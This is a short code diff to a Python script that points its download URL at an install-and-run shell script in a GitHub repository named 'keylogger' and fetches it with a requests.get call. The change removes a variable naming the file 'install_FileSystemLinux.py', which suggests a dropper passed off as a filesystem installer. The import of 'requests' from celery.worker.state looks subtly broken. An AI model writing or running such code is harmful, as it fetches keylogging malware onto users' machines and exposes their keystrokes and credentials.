@@ -1,13 +1,10 @@
 from celery.worker.state import requests
 import os
-import time
 
 
-url = ''
+url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'
 
 filename = 'install_and_run.sh'
-
-own_file = 'install_FileSystemLinux.py'
 
 response = requests.get(url)
 
